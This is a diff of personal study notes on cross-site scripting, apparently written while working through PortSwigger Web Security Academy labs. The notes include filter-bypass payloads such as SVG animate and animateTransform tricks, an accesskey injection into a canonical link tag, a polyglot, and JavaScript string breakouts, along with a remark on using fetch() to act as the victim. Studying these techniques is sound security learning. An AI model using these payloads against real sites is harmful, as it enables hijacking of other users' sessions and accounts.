@@ -5,6 +5,7 @@
 [[HTML attributes]]
 
 
+based on context
 
 * instead of taking notes of all the payloads and all, add them to a automation and take
   note of the philosophy.
@@ -71,9 +72,13 @@ EXAMINE:
 
 3. test for a vulnerability:
   * determine the context within the response where the stored data appears and test
-    appropriate payloads.
+ * look for an, appropriate payload.
 
   with the same methodology as reflected XSS.
+
+EX:
+
+* `<input><script>alert(1);</script></input`
 
 ## reflected:
 
@@ -123,9 +128,10 @@ EXAMINE:
 4. insert a payload:
   * send a combination of characters `abc ' " } < > ; // # - ()` to see how they are
     handled.
-  * try html tags
+  * try html tags, look in the documentation for available attributes.
   * Take note of which ones the application escapes and which get rendered directly.
   * based on the context
+  * close existing tags.
   * to trigger JavaScript execution
   * keep the random value, then insert the payload before or after it, so you can find it by
     searching the random value in the page source.
@@ -133,9 +139,12 @@ EXAMINE:
 
 EX:
 
-* [Reflected XSS into HTML context with most tags and attributes blocked](Reflected XSS into HTML context with most tags and attributes blocked.md)
-* [just custom tags allowed](Reflected XSS just custom tags allowed.md)
-
+* [[XSS_examples#Reflected XSS into HTML context with most tags and attributes blocked| HTML context]]
+* [[XSS_examples#Reflected XSS just custom tags allowed| custom tags]]
+* [[XSS_examples#Reflected XSS event handlers and `href` attributes blocked| SVG and <animate>]]
+* [[XSS_examples#Reflected XSS with some SVG markup allowed| SVG allowed]]
+* [[XSS_examples#angle brackets encoded| angle brackets encoded]]
+* [[XSS_examples#Reflected XSS in canonical link tag| canonical link tag]]
 
 ## DOM-based cross-site scripting:
 
@@ -176,112 +185,36 @@ maybe? DOM XSS with different sources and sinks
 
 EX:
 
-* [sink: `document.write`, source: `location.search`](XSS_examples.md#sink:_`document.write`,_source:_`location.search`)
-* [[XSS_examples.md#sink `innerhtml`, source `location.search` |sink `innerhtml`, source `location.search`]]
-* [[XSS_examples#jQuery anchor; sink: `href` attribute , source: `location.search`|jQuery anchor; sink: `href` attribute , source: `location.search`]]
-* [[XSS_examples#jQuery `selector` sink using a `hashchange` event|jQuery `selector` sink using a `hashchange` event]]
+* [[XSS_examples#sink: `document.write`, source: `location.search`]]
+
+* [[XSS_examples#sink `innerhtml`, source `location.search`]]
+
+* [[XSS_examples#jQuery sink: `selector` using a `hashchange` event |jQuery sink: `selector` using a `hashchange` event]]
+
+* [[XSS_examples#jQuery anchor sink `href` attribute]]
+
 * [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|AngularJS expression with angle brackets and double quotes HTML-encoded]]
 
 #### [[Reflected DOM XSS]]
 
 #### [[Stored DOM XSS]]
 
-
-#### Reflected XSS with event handlers and href attributes blocked
-
-first brute forcing to see tags and events available:
-
-`svg` tag is available:
-
-The svg element is a container that defines a new coordinate system and
-viewport and is used to create and display graphics on the web.
-
-trying:
-`<svg width="200" height="200">
-    <a>
-       <text>Click me</text>
-    </a>
-</svg>`
-
-If text is included in SVG not inside of a `<text>` element, it is not rendered.
-
-`<svg><a><text x=20 y=20>Click me</text></a></svg>`
-having x,y helps to actually display the text. 
-
-`svg` accepts an `<animate>` element which could be used to set attributes.
-`<svg><a><animate attributeName="href" values="javascript:alert()"></animate><text x=20 y=20>Click me</text></a></svg>`
-
-#### Reflected XSS with some SVG markup allowed
-
-test a typical payload: `<img src=1 onerror=alert(1)>`
-
-bruteforce tags.
-
-`?search=<$$>`
-
-there is an SVG and elements we can put inside it.
-
-bruteforce for events.
-
-`?search=<SVG><animateTransform%20$$=1>`
-
-`onbegin` is found
-
-payload: `<svg><animateTransform onbegin="alert()"></animateTransform></svg>`
-
-#### encoded
-
-```
-javascript:/*--></title></style></textarea></script></xmp>
-<svg/onload='+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//'>
-```
-
-with angle brackets encoded:
-this: `https://0a2a0022043296d88235b085003d00fa.web-security-academy.net/?search=%3Cscript%3Ealert%28%27XSS+by+Vickie%27%29%3B%3C%2Fscript%3E`
-will cause this: `<input type="text" placeholder="Search the blog..." name="search" value="" &lt;script&gt;alert('xss="" by="" vickie');&lt;="" script&gt;i">`
-
-a payload without angle brackets: `/?search="onmouseover="alert(1)`: 
-<input type="text" placeholder="Search the blog..." name="search" value="" onclick"alert(1)">
-
-also this: <a id="author" href="javascript:alert(1)">test</a>
-
-#### Lab: Reflected XSS in canonical link tag
-
-
-websites could encode angle brackets but you could still inject attributes.
-
-*canonical link* is a tag in the source code of a page that indicates to search
-engines that a master copy of the page exists, to avoid confusion on duplicate
-documents.
-
-*access keys* allow to provide keyboard shortcut that when pressed will cause
-an event to fire.
-
-this is the canonical link in the code:
-
-`<link rel="canonical" href='https://0aba0085031513cc809f1c7200380018.web-security-academy.net/'>`
-
-it's easy to inject something like `onclick=alert()` but we won't be able to
-see it because it inside the `head` tag. we should use `accesskey`.
-
-payload: `/?' accesskey='Alt+x' onclick='alert()`
-
 ### XSS into JavaScript
 
 the `<script>` tags are executed after the browser is done with html parsing
 and identifying page elements, so breaking the `<script>` doesn't break our payload.
-
-
 #### closing the `script` tag
 
 `</script><script>alert(1)</script>`
 
 #### breaking out of a JavaScript string
 
+```js
 `<script>
 var searchTerms = '123';
 document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
 </script>`
+```
 
 say we add this: `123'; alert();` it won't execute, because there will be an
 excess `'` left which breaks the code: `'123';alerr();';...`
@@ -657,3 +590,14 @@ If you see a request to the path /xss, a blind XSS has been triggered!
  3. in the same docuement: will be too long and slow.
 
 * use tags instead of making a file for everythig? instead of bypass filters, just add a tag #XSS_bypass_filter anywhere in the document, then when needed search for it.
+
+
+#### pwn
+
+* execute JavaScript inside a victim's browser to initiate new HTTP requests masquerading as the victim
+
+`fetch()` could be used for this.
+
+try injecting anyhow
+try injecting the admin
+try getting admin's /flag.
